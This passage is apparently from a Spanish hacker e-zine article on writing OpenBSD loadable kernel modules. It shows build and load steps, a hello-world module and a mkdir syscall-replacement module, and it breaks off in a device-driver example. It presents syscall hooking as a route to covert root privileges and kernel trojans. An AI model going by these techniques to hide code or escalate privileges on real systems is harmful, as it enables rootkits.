@@ -1,0 +1,1766 @@
+ -=( 7A69#13 )=--=( art6 )=--=( Principios para la escritura )=--=( ProdiX )=-
+                              ( de LKM en OpenBSD.           )
+	
+
+	------------------------------------------------------
+	------------------------------------------------------
+	--  Principios para la escritura de LKM en OpenBSD  --
+	------------------------------------------------------
+	------------------------------------------------------
+
+	0.- Indice.
+	1.- Introduccion.
+		- Los LKM.
+		- Sobre el texto.
+	2.- LKM en OpenBSD.
+		- Para que OpenBSD pueda cargar modulos.
+		- Compilando modulos.
+		- Cargando modulos.
+		- Listando los modulos.
+		- Descargando modulos.
+	3.- Programacion de LKM.
+		- Tipos de LKM.
+		- Estructura de programacion.
+	4.- Ejemplos muy basicos de modulos.
+		- Primer ejemplo estructural, con MOD_MISC: "Hola mundo!"
+		- Segundo ejemplo, con MOD_SYSCALL: "mimkdir"
+		- Tercer ejemplo, con MOD_DEV: "ejemplodev"
+	5.- Ejemplos basicos de modulos.
+		- Pimer ejemplo: Tomando el control con los MOD_MISC: syscalls.
+		- Segundo ejemplo: Escondiendo un modulo.
+	6.- Textos recomendados y archivos importantes.
+	7.- Resumen a modo de despedida.
+
+
+
+	- 1.- Introduccion: -
+	  -----------------
+
+	Los LKM, (Loadable Kernel Modules), son pequeñas (o no tan pequeñas)
+funcionalidades que se añaden al kernel de forma dinamica, es decir, sin tener
+la necesidad de recompilar el kernel ni reiniciar la maquina. Con los LKM
+podremos, desde crear nuestro dispositivo hasta crearnos nuestro propio vfs,
+pasando por la cracion/modificacion de llamadas al sistema.
+	¿Para que? Pues, ya adelantando un poco, con los modulos VFS podremos,
+por ejemplo, hacer un modulo que monte un directorio ftp (como si de un disco
+duro se tratase) o por ejemplo, con los modulos SYSCALL, podremos modificar las
+llamadas al sistema para que un usuario tenga privilegios de superusuario sin
+realmente tener UID 0. Pero eso si, un LKM no tiene por que ser necesariamente
+programado con fines "ilegales", lo que se programe con los LKM sera en funcion
+de lo que tenga en mente el programador.
+
+	El texto no es para explicar como programar LKM desde cero, es
+conveniente tener en mente algunos conceptos. Para eso ya hay otros textos mas
+grandes y seguro que mejor redactados que este, asi que para los que nunca
+hayan programado un LKM les recomiendo que se lean otro texto (algun texto de
+linux, por que sobre OpenBSD no hay nada decente excepto esto :P, cualquier
+texto sobre lkm de linux nos vale) y luego acudan aqui para aprender a hacer lo
+mismo en OpenBSD.
+
+
+	- 2.- LKM en OpenBSD. -
+	  -------------------
+
+a) Para que OpenBSD pueda cargar modulos:
+-----------------------------------------
+	Para poder probar nuestros propios modulos debemos tener soporte para
+LKM en el kernel y poner el securelevel a 0 (insecure mode) o -1 (permanently
+insecure mode) en nuestro /etc/rc.securelevel.
+ 	Para dar soporte a LKM en el kernel solo tenemos que añadir una linea
+con: "option		LKM" al archivo de configuracion del kernel y volver a
+compilar. Para poner el securelevel a 0, tenemos que editar el
+/etc/rc.securelevel ya que, por defecto, al arrancar el sistema el securelevel
+se pone a 1 y una vez que esta en uno no se puede bajar, unicamente subir, sin
+reiniciar el sistema (man securelevel), por lo que despues de haber
+recompilado el kernel, nos aseguramos de poner el securelevel a 0 o -1.
+
+	OpenBSD, mientras arranca tiene el securelevel a 0 y se pueden cargar,
+LKM, despues, init lee el /etc/rc.securelevel y ya se cambia a -1, 1, 2 o se
+queda en 0. El tema esta que con los LKM se puede troyanizar el kernel en caso
+de que alguien tome UID 0, asi que teniendo el sistema con securelevel a 1 se
+evita correr ese riesgo (como ya he dicho, con kern.securelevel = 1, no se
+pueden cargar LKM´ s ni bajar el securelevel), por eso viene por defecto el
+/etc/rc.securelevel a 1. De esta forma, si el admin quiere utilizar algun LKM,
+lo que se suele hacer es cargar los modulos al inicio del sistema, antes de que
+init lea el /etc/rc.securelevel y lo suba.
+ 	Tambien puede ser otra opcion quedar en /etc/rc.securelevel a 0 y
+despues, una vez cargados los modulos necesarios, poner el securelevel a 1 o 2
+con "sysctl -w kern.securelevel=1" poner el securelevel de forma que ya no se
+puedan cargar otros LKM, pero eso ya cuando esten los modulos acabados... Por
+lo que, eso que dice la gente.. "Los LKM son inseguros" es falso, tu puedes
+bloquear el sistema para que no se carguen mas.
+	Pero como vamos a desarollar LKM's, vamos a poner el securelevel a 0,
+para que podamos toquetear sin problemas en /dev/mem y /dev/kmem.
+
+b) Compilando modulos:
+----------------------
+	Una vez que tenemos un LKM programado, para poder usarlo solo hace
+falta compilarlo y cargarlo para sacar partido a esas horas de trabajo ;D
+Para compilar, lo haremos de esta manera:
+
+-->	ramblo$ gcc -O2 -Wall -D_KERNEL -I/sys -o temporal.o -c modulo.c
+
+	De esta manera se nos genera un archivo "temporal.o". Ahora hace falta
+linkarlo, asi:
+
+-->	ramblo$ ld -r -o final.o temporal.o
+
+	Aqui acaba este paso.
+
+c) Cargando modulos:
+--------------------
+	En OpenBSD, los modos se cargan con "modload" y se hace asi, (Vamos a
+linkar nuestro modulo al kernel, no creo que sea necesario especificar que se
+necesitan permisos root para cargarlo).
+
+-->	ramblo# modload -e entrypoint -o output modulo_linkado
+
+	Aqui, entrypoint es la funcion principal de nuestro modulo, output es
+un fichero temporal que va a usar el ld cuando linke el modulo al kernel. Si
+todo va bien, nos sacara por consola "Module loaded as ID XXX" y al syslogd
+un mensajito sobre el LKM mas o menos como esta linea del /var/log/messages
+(No tiene que ser necesariamente asi, por donde saque el kernel los menajes
+depende de como tengas configurado el syslogd, pero por defecto se saca al
+/var/log/messages y a la pantalla, cosa que a veces es molesta):
+
+-->	DDB symbols added: 125748 bytes
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	...
+-->	Aug 15 06:32:58 ramblo /bsd: DDB symbols added: 125748 bytes
+
+d) Listando modulos:
+--------------------
+	Para listar los modulos se hace un modstat, mas facil imposible...
+
+-->	ramblo# modstat
+-->	Type     Id Off LoadAddr Size Info     Rev Module Name
+-->	SYSCALL   0 210 e0aa9000 0002 e0aaa008   2 un_ejemplo
+-->	ramblo#
+
+	Type        = Es el tipo de modulo.
+	Id          = Es un numero de referencia, usado para cuando se
+		      descarga.
+	Off         = Si es un modulo de syscall, Off es el offset de la
+		      syscall, si es un modulo de dispositivo Off es el
+		      major number, de no ser asi, es 0.
+	Loadaddr    = Es la direccion de memoria del modulo.
+	Size        = Tamaño del modulo.
+	Info        = Esta seccion depende del modulo.
+	Rev         = Version del soporte de modulos.
+	Module Name = Nombre del modulo. :-)
+
+
+e) Descargando modulos:
+-----------------------
+	Para descargar un modulo: "modunload -i ID" o "modunload -n nombre",
+normalmente es mas comodo escribir la ID, ya que normalmente no tendremos mas de
+diez modulos cargados, y escribir "5" es mas comodo que escribir "un_ejemplo",
+pero eso es cuestion de gustos...
+
+-->	ramblo# modunload -i 0
+-->	ramblo#
+
+
+	- 3.- Programacion de LKM. -
+	  ------------------------
+
+a) Tipos de modulos:
+--------------------
+	Hay varios tipos de modulos, cada uno indicado para una funcion:
+
+	a.1) Modulos "system call": Sirven para añadir syscalls al sistema o
+	     modificar una syscall añadiendo la nuestra propia y haciendo que
+	     esta llame a la antigua.
+	a.2) Modulos "virtual file system": Sirven para hacer VFS's...
+	a.3) Modulos "device driver": Para añadir nuevos pseudo-dispositivos.
+	a.4) Modulos "execution interpreters": Sirven para poder ejecutar
+	     archivos que sin el modulo no se podrian ejecutar.
+	a.5) Modulos "miscellaneous": Son todos los modulos que no se
+	     pueden clasificar dentro de otros tipos. Los modulos MISC, tambien
+	     se usan para hacer modulos que pretenden implementar mas de un
+	     tipo de modulo, o por ejemplo, cuando en un mismo modulo quieres
+	     añadir dos syscalls. ¿Desventajas? Si, por ejemplo añades una
+	     syscall declarando el modulo como MISC, para descargar la syscall
+	     tienes que volver a poner todo como estaba antes a mano, si se
+	     declarase como SYSCALL se haria automaticamente. Esto no tiene
+	     por que ser una desventaja, ya que el programador tiene el control
+	     total de lo que pasa...
+
+	En el texto se van a tratar unicamente los MOD_MISC MOD_SYSCALL y
+MOD_DEV ya que son los mas utiles tanto para administrar un sistema como para
+"desadministrarlo" ;P Aun asi, lo que mas se usaran seran los MOD_MISC ya que
+con MOD_MISC lo haces todo tu y se puede conseguir tambien todo lo que se
+consigue con los otros tipos de modulo. Yo entre facilidad de programacion y
+control elijo control. ;)
+
+
+b) Estructura de programacion:
+------------------------------
+	Todo modulo sigue esta estructuracion: (Esto es en generico, despues
+cada tipo de modulo tiene sus propios añadodos caracteriscitos, pero eso ya se
+iran especificando en su momento)
+
+	b.1) Cabezeras.
+	b.2) Funciones especificas.
+	b.3) Funcion load.    -\
+	b.4) Funcion unload.  _/ (Pueden ser la misma)
+	b.5) Declaracion como modulo.
+	b.6) Funcion "entry point".
+
+
+ b.1) Cabezeras:
+	Las cabezeras necesarias para lo minimo son: (Echadles un vistazo)
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>  
+
+	Por supuesto, iremos añadiendo mas cabezeras en funcion de lo que
+vayamos usando en el modulo, pero estas cabezeras son las minimas propias de un
+lkm en OpenBSD.
+
+
+ b.2) Funciones a parte:
+	Cuando hacemos un modulo, no siempre (nunca) nos basta con las
+funciones minimas, se van metiendo por aqui... Por ejemplo, funciones de la
+libc que queramos usar en el modulo, o simplemente funciones que querramos o
+necesitemos poner... Estas funciones se pondrian aqui.
+
+
+ b.3) Funcion load:
+	Es la funcion a la que se llama cuando se carga el modulo.
+	La funcion puede tener el nombre que sea, pero lo usual es ponerle un
+nombre del tipo NOMBREDELMODULO_load, no obstante tambien se le puede poner
+un nombre arbitrario siempre y cuando se le indique el nombre elegido en la
+funcion entry cuando se llame a la macro DISPATCH. (Despues vermos esto)
+	La definicion siempre es la misma, los parametros han de ser los
+mismos SIEMPRE y siempre se tiene que definir como una funcion int static, de
+otra manera no funcionara. En lo que es la definicion, solo puede cambiar
+el nombre de la funcion y el contenido. (Mas que nada por estandarizar el
+codigo y hacerlo mas legible para otra gente)
+
+(p.e.)
+static int
+xxx_load(struct lkm_table *lkmtp, int cmd)
+{
+	if(cmd == LKM_E_LOAD) {
+
+		printf("-- Module XXX --\nModule XXX loaded.\n-- Module XXX --\
+	}
+
+	return 0;
+}
+(--)
+	Los parametros de la funcion son una estructura de modulo de kernel y
+un int. Normalmente se pone lkm_table y cmd... cmd es como command, pues eso.
+Como ya dije, lo suyo es dejar esos nombres siempre para facilitar la lectura a
+quien quiera leer el modulo en un futuro.
+
+
+ b.4) Funcion unload:
+	Es la funcion en la pone lo que hace el modulo al descargarse. Por
+ejemplo,  en el caso de la modificacion de syscalls, es aqui donde tenemos
+que encargarnos de colocar como estaba la syscall anterior.
+	Igual que con la fuincion "load", se le puede poner un nombre
+cualquiera siempre y cuando se especifique dicho nombre a DISPATCH en la
+fuincion principal. Lo normal es usar un nombre de funcion
+NOMBREDELMODULO_unload.
+	En cuanto a la definicion de la funcion, decir lo mismo que de la de
+carga, los parametros son los mismos.
+
+(p.e.)
+static int
+xxx_unload(struct lkm_table *lkmtp, int cmd)
+{
+	if(cmd == LKM_E_UNLOAD) {
+
+		printf("-- Module XXX --\nModule XXX unloaded.\n-- Module XXX -
+	}
+
+	return 0;
+}
+(--)
+
+/*************/
+NOTA: La funcion "load" y la funcion "unload" pueden ser las mismas, para eso
+esta "cmd", que como ya dije, es un int y cmd == 1 si es para cargar el
+modulo y cmd == 2 si es para descargarlo.
+
+static int
+carga_y_descarga(struct lkm_table *lkmtp, int cmd)
+{
+	if(cmd == LKM_E_LOAD) { /* LKM_E_LOAD esta definido en lkm.h como 1 */
+
+		printf("-- Module XXX --\nModule XXX CARGANDOSE.\n-- Module XXX -\n");
+		return 0;
+	}
+
+	if(cmd == LKM_E_UNLOAD) { /* LKM_E_UNLOAD esta definido como 2 */
+
+		printf("-- Module XXX --\nModule XXX DESCARGANDOSE.\n-- Module XXX -
+		return 0;
+	}
+
+	return(-1)
+
+}
+/*************/
+
+
+ b.5) Declaracion como modulo:
+	La declaracion de los modulos se hace de diferente manera en funcion
+del tipo de modulo que sea, se añadira antes de la definicion de la funcion
+entry:
+	
+	a) Para modulos tipo "system call":
+MOD_SYSCALL(nombre,offset, sysentp);
+(p.e.)
+MOD_SYSCALL("mi_modulo", SYS_getuid, &la_syscall_sysent);
+(--)
+	Donde: "mi_modulo" es el nombre del modulo, offset es el offset de
+	la syscall y sysentp es un puntero a la estructura "sysent" de la
+	syscall. Mas adelante, en los ejemplos se aclarara que es la estructura
+	sysent.
+
+
+	b) Para modulos tipo "virtual file system":
+MOD_VFS(name,vfsslot,vfsconf);
+(p.e.)
+MOD_VFS("mi_modulo",vfsslot,vfsconf);
+(--)
+	Donde: EN EL TEXTO NO VAMOS A TRATAR ESTE TIPO DE MODULOS.
+
+
+	c) Para modulos tipo "device driver":
+MOD_DEV(name,devtype,devslot,devp);
+(p.e.)
+MOD_DEV("mi_modulo",devtype,devslot,devp);
+(--)
+	Donde: "mi_modulo" es el nombre del modulo, devtype es el tipo de
+	dispositivo CHAR o BLOCK, devslot va a ser el "major number" del
+	dispositivo (si no importa se pone -1, es decir, el primero libre que
+	haya), y devp es la estructura de las acciones configuradas para el
+	dispositivo.
+
+	d) Para modulos tipo "execution interpreters":
+MOD_EXEC(name,execslot,execsw);
+(p.e.)
+MOD_EXEC("mi_modulo",execslot,execsw);
+(--)
+	Donde: EN EL TEXTO NO VAMOS A TRATAR ESTE TIPO DE MODULOS.
+
+
+	e) Para modulos tipo "miscellaneous":
+MOD_MISC(name);
+(p.e.)
+MOD_MISC("mi_modulo");
+(--)
+	Donde: "mi_modulo" es el nombre del modulo. Asi de simple. :-)
+
+
+
+ b.6) Funcion entry point, funcion modulo:
+	Esta funcion, la funcion principal por asi llamarla, la funcion "entry"
+generalmente consiste en una llamada a la macro DISPATCH (definida en la
+cabezera /usr/include/sys/lkm.h ). La llamo tambien funcion modulo por que
+dicha funcion suele llevar el mismo nombre que el modulo en si y por que de
+siempre la he llamado asi ;D.
+
+	Los argunmentos que se le pasan a DISPATCH() son:
+	1.- lkmtp       -> Estructura del modulo. (Ver la definicion de
+                          lkm_table en lkm.h)
+	2.- cmd         -> Es un int (1/2/¿3?) que se usa para cuando se carga
+                          (1) o se descarga el modulo (2).
+	3.- ver         -> Version del LKM del sistema, en las releases no
+                          demasiado antiguas, (al menos las que yo he usado,
+			  2.8 2.9 y 3.0), ver==2.
+	4.- lkm_load    -> Nombre de la funcion "load" (Cuando cmd=1)
+	5.- lkm_unload  -> Nombre de la funcion "unload" (Cuando cmd=2)
+	6.- lkm_stat    -> Nombre de la funcion "stat", se usa cuando por alguna
+                          razon quieres que se haga algo al mirar el estado del
+                          modulo, pero no suele ser util, en caso de que no se
+                          quiera que haga nada, se puede poner lkm_nofunc :)
+
+(p.e.)
+xxx( lkmtp, cmd, ver)
+struct lkm_table        *lkmtp;
+int                     cmd;
+int                     ver;
+{
+        DISPATCH(lkmtp, cmd, ver, xxx_load, xxx_unload, lkm_nofunc);
+}
+(--)
+
+
+
+
+	- 4.- Ejemplos muy basicos de modulos -
+	 -------------------------------------
+
+	Bien, mas o menos ya tenemos por donde agarrar a los modulos, ahora
+vamos a afirmar lo que hemos aprendido y a resolver las dudas con un par de
+ejemplos, el primero, es una especie de "Hola mundo!", los demas, la verdad es
+que tampoco tienen ninguna utilidad, pero ilustrativos igualmente, que es lo
+que se pretende. Mas adelante en el texto iremos viendo mas ejemplos fuera de
+la seccion de ejemplos de modulos. Esta parte esta hecha solo para que se vea
+en la practica como es un LKM basico en OpenBSD.
+
+
+a) Primer ejemplo, estructural: "Hola mundo!":
+----------------------------------------------
+	Este modulo es como el tipico "Hola mundo!", pero como me parece muy
+repetitivo eso de "Hola mundo!" he decidido poner "ColaCao original o ColaCao
+Turbo?", que queda mucho mas original. Como el modulo no crea ninguna syscall
+ni ningun VFS ni ningun dispositivo ni nada de nada, es decir, no es un modulo
+"predefinido" vamos a declarar el modulo como de tipo "MISC". En el codigo del
+modulo ire aclarando algunas cosas, pero la verdad es que si se ha leido con
+atencion lo de antes no hace mucha falta aclarar nada. Aun asi, lo hare.
+
+/*** COMIENZO DEL PROGRAMA *** lkm.c *****************************************/
+/*
+ * Metemos las cabezeras necesarias.
+ */
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+
+/*
+ *  Declaramos el modulo como "MISC", solo se ha de especificar el nombre,
+ * dicho nombre es "colacao".
+ */
+MOD_MISC("colacao");
+
+/*
+ * Esta es la fuincion que a continuacion, al llamar a DISPATCH() decimos que
+ * se llame cuando se carga el modulo. Recuerdo que los parametros de la
+ * funcion ya los explique antes, que, por supuesto, se pueden cambiar, pero
+ * mejor no hacerlo por cuestiones de "legibilidad".
+ */
+static int
+colacao_load(struct lkm_table *lkmtp, int cmd)
+{
+  if(cmd == LKM_E_LOAD)
+  {
+    printf("-- ColaCao --\nColaCao original o ColaCao Turbo?\n-- ColaCao --\n");
+  }
+  return 0;
+}
+
+/*
+ * Esta es la funcion opuesta a la anterior, esta funcion sera llamada cuando
+ * el modulo se descarge.
+ */
+static int
+colacao_unload(struct lkm_table *lkmtp, int cmd)
+{
+  if(cmd == LKM_E_UNLOAD)
+  {
+    printf("-- ColaCao --\nPero si a mi me gustaban los grumitos!\n-- ColaCao --\n");
+  }
+  return 0;
+}
+
+/*
+ *  Esta es la "entry point function", por asi decirlo es como la funcion
+ * main() en un programa C normal.
+ *  Como se puede ver, aqui especificamos cuales van a ser las funciones a las
+ * que se llama cuando el modulo se carga (cuarto parametro), cuando el modulo
+ * se descarga (quinto parametro) y cuando se comprueban el estado del modulo.
+ */
+int
+colacao( lkmtp, cmd, ver)
+struct lkm_table	*lkmtp; 
+int			cmd;
+int			ver;
+{
+	DISPATCH(lkmtp, cmd, ver, colacao_load, colacao_unload, lkm_nofunc);
+}
+
+/*** FIN DEL PROGRAMA ********************************************************/
+
+	Ahora compilamos, linkamos y cargamos el modulo:
+
+-->	ramblo$ gcc -O2 -Wall -D_KERNEL -I/sys -c lkm.c
+-->	ramblo$ ld -r -o colacao.o lkm.o
+-->	ramblo# modload -o colacao -ecolacao colacao.o
+-->	Module loaded as ID 0
+
+	El modulo en si solo saca por los mensjaes del kernel el mensajito,
+asi que vamos al /var/log/messages a ver si ha funcionado...
+
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	...
+-->	...
+-->	Aug 16 18:12:11 ramblo /bsd: -- ColaCao --
+-->	Aug 16 18:12:11 ramblo /bsd: ColaCao original o ColaCao Turbo?
+-->	Aug 16 18:12:11 ramblo /bsd: -- ColaCao --
+-->	Aug 16 18:12:11 ramblo /bsd: DDB symbols added: 125748 bytes
+
+/* Desde aqui decir que a mi me gusta mucho mas el ColaCao de toda la vida */
+
+	Aqui dice que se ha cargado... Vamos a ver si es verdad, vamos a
+listar los modulos que hay cargados en el sistema con "modstat"  y asi,
+ver si esta nustro primer modulo en la lista :)
+
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	MISC      0   0 e0972000 0002 e0973000   2 colacao
+
+	Ahi se pude ver que el modulo, ciertamente esta cargado. Si quieres ver
+que significa cada cosa, recuerdo que eso ya lo dije en la segunda parte, :P
+seccion "d". Bien, como el modulo es totalmente inservible y no lo queremos
+para nada en el sistema, vamos a descargarlo y a ver que pasa.
+
+-->	ramblo# modunload -i 0
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	...
+-->	...
+-->	Aug 16 18:27:58 ramblo /bsd: -- ColaCao --
+-->	Aug 16 18:27:58 ramblo /bsd: Pero si a mi me gustaban los grumitos!
+-->	Aug 16 18:27:58 ramblo /bsd: -- ColaCao --
+
+	Bien, aqui podemos ver como lo hemos descargado, hemos vuelto a listar
+los modulos y no ha aparecido en la lista. Posteriormente hemos visto el
+/var/log/messages y podemos ver como al igual que al cargar el modulo, imprimia
+el mensajito que se le decia, al descargarlo hace lo propio tambien.
+	A partir de ahora, en los ejemplos solo vendra el codigo en si y los
+comentarios propios de cada modulo, ya que asumo que se conoce como cargar,
+listar y descargar un modulo...
+
+b) Segundo ejemplo, con MOD_SYSCALL: "mimkdir":
+-----------------------------------------------
+	Pues sigo con mi politica de ejemplos inservibles, vamos a hacer un
+modulo que haga que cada vez que se llame a la syscall mkdir se saque por la
+salida del kernel algun mensajito que diga el nombre del directorio que se va a
+crear. Si, es un modulo ciertamente inutil, pero si quieres hacer un modulo
+util usa tu imaginacion, aqui estamos para APRENDER a programarlos.
+	A ver, empezamos, la idea es que cada vez que se haga un directorio se
+imprima un mensaje en la salida del kernel asi : "Creando directorio PATATIN"
+asi que vamos a ver que syscall tenemos que modificar. Para ello, usando ktrace
+y kdump vamos a ver las syscall a las que se llama cuando hacemos un directorio
+con el comando mkdir:
+
+-->	ramblo$ ktrace mkdir /home/prodix/lalala
+-->	ramblo$ kdump -t c -f ktrace.out 
+-->	  7183 ktrace   RET   ktrace 0
+-->	  7183 ktrace   CALL  execve(0xdfbfd6e0,0xdfbfdbd8,0xdfbfdbe4)
+-->	  7183 mkdir    RET   execve 0
+-->	  7183 mkdir    CALL  issetugid
+-->	  7183 mkdir    RET   issetugid 0
+-->	  7183 mkdir    CALL  umask(0)
+-->	  7183 mkdir    RET   umask 18/0x12
+-->	  7183 mkdir    CALL  mkdir(0xdfbfdc42,0x1ed)
+-->	  7183 mkdir    RET   mkdir 0
+-->	  7183 mkdir    CALL  exit(0)
+-->	ramblo$
+
+	Podemos ver que mkdir llama a unas cuantas syscalls: execve, issetugid,
+umask, mkdir y exit. Tiene pinta que la syscall que crea el directorio en si es
+la syscall "mkdir", pero como en otros casos podria no ser tan intuitivo, asi
+que hacemos un "man 2 mkdir" y vemos si es esa o no... Al hacer el man, se ve
+claramente que si, esa syscall es la que lo hace, por lo que tendriamos que
+crear una syscall y ponerla en el offset de la syscall "mkdir". A efectos
+practicos, modificar "mkdir". Esta syscall lo unico que deberia de hacer es:
+		1.- Sacar por la salida del kernel el mensaje.
+		2.- Llamar a la syscall mkdir de siempre.
+	De esta manera el directorio se crea igualmente y tenemos el mensajito.
+Aqui tenemos el codigo del modulo...
+
+/*** COMIENZO DEL PROGRAMA *** mimkdir.c *************************************/
+/*
+ * Como siempre, las cabezeras...
+ */
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/syscall.h>
+#include <sys/mount.h>
+#include <sys/conf.h>
+#include <sys/syscallargs.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/file.h>
+#include <sys/filedesc.h>
+#include <sys/errno.h>
+#include <sys/proc.h>
+
+/*
+ *  Esto es una estructura con la que se indican los argumentos que va a
+ * manejar la syscall. En este caso, la syscall trabajara con una cadena que se
+ * llama "path" (que es el directorio a crear) y un int "mode" (que especifica,
+ * en decimal, los modos del directorio), si quieres cambiar los modos o algo,
+ * puedes pasarlo a octal, modificarlo, y volverlo a pasar a decimal o
+ * modificarlo directamente. De todas formas dudo que se vaya a usar el modulo,
+ * asi que no le voy a dar mas importancia al tema.
+ *  Para ver lo que se le pasa a cada syscall hay que mirar en las paginas man
+ * de la syscall o en el /usr/include/sys/syscall.h, en donde vienen todas las
+ * syscall de OpenBSD con lo que devuelve y recibe cada syscall.
+ */
+struct la_syscall_argumentos {
+        syscallarg(const char *) path;
+        syscallarg(int) mode;
+};
+
+
+/*
+ *  Bien, esta funcion es la syscall en si. La definicion de una syscall
+ * siempre es la misma, se define como una funcion estatica y que devuelve un
+ * entero, los argumentos tambien son los mismos. Las variables que quieras
+ * pasar a la syscall se especifican mediante la estructura que creamos antes
+ * y que meteremos posteriormente en la estructura "sysent" que luego
+ * definiremos y usaremos.
+ *  Lo normal es que no te enteres de como va el tema hasta que termines de 
+ * leer el ejemplo, pero es muy simple.
+ *  Es muy importante declarar la funcion de la syscall asi y que devuelva un
+ * int. Cero si ha terminado bien y otra cosa si ha ido mal, generalmente -1.
+ *  Para que la syscall devuelva algo utilizable se usa retval, mira en el
+ * ejemplo como funciona.
+ */
+static int
+la_syscall (struct proc *p, void *v, register_t *retval) 
+{       
+	struct la_syscall_argumentos *uap = v;
+	int ret;
+
+	printf("Llamada a mimkdir: %s,%d",SCARG(uap,path),SCARG(uap,mode));
+
+        ret=sys_mkdir(p,v,retval);
+        
+        return ret;
+}
+/*
+ *  Esta es la estructura "sysent" que mencionamos en el comentario de antes,
+ * el primer elemento, es el numero de variables que recibe la syscall,
+ * (recordad la estructura "la_syscall_argumentos"), pues el numero de
+ * elementos de esa estructura es el numero que hay que poner como primer
+ * elemento de esta estructura. El segudo elemento es el tamaño de la
+ * estructura de argumentos. El tercer argumento es un puntero a la funcion que
+ * hace de syscall.
+ */
+static struct sysent la_syscall_sysent = {
+        2,
+        sizeof(struct la_syscall_argumentos),
+        la_syscall
+};
+
+/*
+ *  Tan simple como el resto, el primer argumento al llamar a la macro
+ * MOD_SYSCALL es el nombre de la syscall. El segundo es el offset de la
+ * syscall (si es una syscall nueva, es decir no quieres reemplazar a ninguna
+ * ya hecha, se pone "-1" para indicar que ocupe un offset libre. Y el tercer
+ * argumento es un puntero a la estructura "sysent", que en este caso, como
+ * se llamaba "la_syscall_sysent" pues ponemos "&la_syscall_sysent".
+ */
+MOD_SYSCALL( "mimkdir", SYS_mkdir, &la_syscall_sysent);
+
+/*
+ *  En la funcion entry point, llamada esta vez "mimkdir" tambien siempre se
+ * define de la misma forma y en su interior, al llamar a DISPATCH, en la funcion de
+ * carga, de descarga y de status, ponemos "lkm_nofunc" para especificar que no
+ * tiene que llamar a ninguna funcion, ya que hemos declarado el modulo como
+ * un modulo de tipo SYSCALL y de esta manera el solo vuelve a poner la syscall
+ * antigua en su offset.
+ */
+int mimkdir (struct lkm_table *lkmtp, int cmd, int ver)
+{
+        DISPATCH(lkmtp, cmd, ver, lkm_nofunc, lkm_nofunc, lkm_nofunc)
+}
+/*** FIN DEL PROGRAMA ********************************************************/
+
+	Esto ha sido el segundo ejemplo, vamos a pasar del papel a la practica y
+a ver como funciona el codigo en accion...
+
+-->	ramblo$ gcc -O2 -Wall -D_KERNEL -I/sys -c mimkdir.c
+-->	ramblo$ ld -r -o syscall.o mimkdir.o
+-->	ramblo#	modload -o mimkdir -emimkdir syscall.o
+-->	Module loades as ID 0
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	Aug 20 12:32:21 ramblo /bsd: DDB symbols added 125748 bytes
+-->	ramblo# mkdir /home/prodix/lalala
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	Aug 20 12:32:29 ramblo /bsd: Llamada a mimkdir: /home/prodix/lalala
+
+	Bien este es el ejemplo, y como se puede ver, funciona bien. Siempre
+que se modifique (cree) una syscall se va a seguir mas o menos el mismo
+procedimiento, a veces, por supuesto sera (mucho, muchisimo) mas complicado.
+	Las complicaciones que se puede tener que me he ido encontrando yo, que
+tengan que ver con la metodologia de programacion del kernel (no con problemas
+puntuales de cierta syscall) es que una syscall se modifica, pero esa recibe
+algo de otra syscal que tambien tienes que modificar para que lo que has
+cambiado en la primera syscall sirva para algo... Problema? Si se declara el
+modulo con MOD_SYSCALL solo se puede crear/modificar una syscall. Soluciones?
+Se puede recurir a dos cosas. La primera solucion es hacer dos modulos con
+MOD_SYSCALL (comda chapuza). La segunda es hacer un modulo con MOD_MISC (es lo
+que se deberia hacer si se pretende hacer un modulo serio, pero la programacion
+del modulo deja de ser tan simple y facil. (Porque, hablando en plata...
+Hacerlo de antes seria una verdadera pollada).
+	Si hacemos dos modulos syscall, habria que cargarlos por separado y
+consecuentemente, al hacer un modstat saldrian dos modulos, uno por cada
+syscall, no me parece una buena idea, y aun que ciertamente es mucho mas comodo
+no es nada elegante. Para ver un ejemplo nos esperaremos un poquito, por que
+considero mas oportuno primero escribir sobre la creacion de dispositivos con
+modulos lkm.
+
+c) Tercer ejemplo, con MOD_DEV: "ejemplodev":
+---------------------------------------------
+	Ahora vamos a probar con los modulos de tipo dispositivo, con uno de
+tipo de "echo", es decir, el dispositivo saca por la salida del kernel lo que se
+haya escrito en el.
+	Un dispositivo no es ni mas ni menos que un archivo que se utiliza como
+interfaz entre los usuarios y el kernel y con unas propiedades especiales.
+Vamos a programar las acciones a las que queremos que el modulo responda, (no es
+necesiario asociar una funcion a cada cosa, en nuestro primer modulo solo
+usaremos open-close read-write e ioctl)
+	Empezamos con el codigo del modulo y voy explicando...
+
+/*** COMIENZO DEL PROGRAMA *** ejemplodev.c *************************************/
+/*
+ * Cabezeras...
+ */
+#include <sys/param.h>
+#include <sys/fcntl.h>
+#include <sys/systm.h> 
+#include <sys/ioctl.h>
+#include <sys/exec.h>
+#include <sys/conf.h>
+#include <sys/lkm.h>
+
+#define ODREAD  _IOR('O', 0, struct estructura_datos)
+#define ODWRITE _IOW('O', 1, struct estructura_datos)
+
+/*
+ *  Si queremos que nos avise cuando se abre/cierra el dispositivo.
+ */
+//#define QUIET
+
+/*
+ * Definimos el BUFFER para 100, suficiente.
+ */
+#define BUFFER 100
+
+/*
+ *  El dispositivo se comunica mediante una estructura de datos, en la que
+ * puedes  meter todos los campos que quieras, en nuestro ejemplo con uno nos
+ * vale. Asi que definimos nuestro tipo de estructura como "estructura_datos" y
+ * nos creamos una.
+ */
+static struct estructura_datos {
+	char msg[BUFFER];
+} pepe;
+
+/*
+ *  Esta es una macro que es la que hace que ejemplodev sea un dispositivo
+ * mediante llamadas a la macro dev_decl...
+ * #define dev_decl(n,t)	__CONCAT(dev_type_,t)(__CONCAT(n,t))
+ */
+cdev_decl(ejemplodev);
+
+/*
+ *  Esta es la "estructura de acciones del dispositivo", la llamo asi por que
+ * como no hay nada de documentacion sobre LKM en OpenBSD excepto dos
